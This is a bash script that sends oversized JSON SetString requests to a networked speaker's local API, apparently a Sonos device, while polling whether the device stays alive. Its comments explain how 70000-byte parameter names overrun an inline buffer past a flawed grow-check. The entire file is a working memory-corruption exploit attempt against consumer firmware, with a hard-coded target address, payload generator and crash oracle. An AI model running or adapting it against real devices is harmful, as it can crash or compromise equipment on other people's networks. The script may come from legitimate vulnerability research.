#!/usr/bin/env bash
# jc7 T2 escalation — cursor-overrun grow-check. Args DO arrive (SetString proof);
# value escaping is proven separately, so the under-request math (2*len(value)+16 vs
# 2*len(name)+len(value)+6) is what runs here: a 70000-byte name walks the cursor ~140 kB
# per element past the 34148-byte inline buffer while the grow-check sees an underflowed
# "space left". Oracle: rc class (402 = action resolved + body parsed), liveness, and a
# live-data + round-trip check afterwards.
set -u
IP=${IP:-192.168.4.86}; U=${U:-RINCON_7828CA9221DC01400}; OUT=${OUT:-recon/jc7/weak_fire2.tsv}
SPACING=${SPACING:-3}
printf 'ts\tcase\tstatus\trc\tbytes\n' > "$OUT"
poll() { while :; do printf '%s %s\n' "$(date -u +%H:%M:%S.%N)" \
  "$(curl -s -m 2 -o /dev/null -w '%{http_code}' "http://$IP:1400/status/VERSION")"; sleep 0.1; done; }
: > "$OUT.poll"; poll & POLL=$!
post() { printf '%s' "$1" > /tmp/jc7_w2.json
  local code; code=$(curl -sk -m 40 -o /tmp/jc7_w2.out -w '%{http_code}' --http1.1 -X POST \
    -H 'X-Sonos-Api-Key: x' -H 'Content-Type: application/json' --data-binary @/tmp/jc7_w2.json \
    "https://$IP:1443/api/v1/players/$U/${2:-upnpSystemProperties}")
  RC=$(grep -o '"result":[0-9]*' /tmp/jc7_w2.out | cut -d: -f2)
  printf '%s\t%s\t%s\t%s\t%s\n' "$(date -u +%H:%M:%S)" "$1" "$code" "${RC:--}" \
    "$(wc -c < /tmp/jc7_w2.out|tr -d ' ')" | tee -a "$OUT"; }
gen() { python3 - "$1" "$2" <<'PY'
import json,sys
n=int(sys.argv[1]); L=int(sys.argv[2])
import io
open("/tmp/jc7_gen.json","w").write(json.dumps({"method":"SetString","input":[{"name":("N%05d"%i)+"A"*(L-5),"value":"x"} for i in range(n)]}))
PY
}
for n in 20 50 100; do gen $n 70000; post "$(cat /tmp/jc7_gen.json)" upnpSystemProperties; sleep "$SPACING"; done
gen 1 500000; post "$(cat /tmp/jc7_gen.json)" upnpSystemProperties; sleep "$SPACING"
gen 20 500000; post "$(cat /tmp/jc7_gen.json)" upnpSystemProperties; sleep "$SPACING"
# post-checks: live data, then a normal round-trip
post '{"method":"GetZoneAttributes"}' upnpDeviceProperties; sleep "$SPACING"
post '{"method":"SetString","input":[{"name":"VariableName","value":"jc7z"},{"name":"StringValue","value":"ok"}]}' upnpSystemProperties
sleep 2
post '{"method":"GetString","input":[{"name":"VariableName","value":"jc7z"}]}' upnpSystemProperties
python3 -c "import json;d=json.load(open('/tmp/jc7_w2.out'));print('READBACK',d.get('parameters'))" >> "$OUT"
st=$(curl -s -m 4 -o /dev/null -w '%{http_code}' "http://$IP:1400/status/VERSION")
printf '%s\tBATCH_END\t%s\t-\t%s\n' "$(date -u +%H:%M:%S)" "$st" "$([ "$st" = 200 ] && echo alive || echo DEAD)" | tee -a "$OUT"
kill $POLL 2>/dev/null
